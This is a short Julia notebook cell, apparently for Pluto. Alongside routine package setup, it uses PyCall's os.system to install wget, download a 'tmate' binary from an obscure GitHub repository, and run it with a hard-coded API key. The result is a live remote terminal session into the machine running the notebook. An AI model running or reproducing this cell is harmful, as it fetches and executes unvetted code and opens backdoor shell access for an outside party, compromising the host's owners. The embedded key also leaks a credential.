begin
	import Pkg
	Pkg.update("Pluto")
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("apt-get update -y && apt-get install curl wget -y")
	os.system("wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n tmate")
end
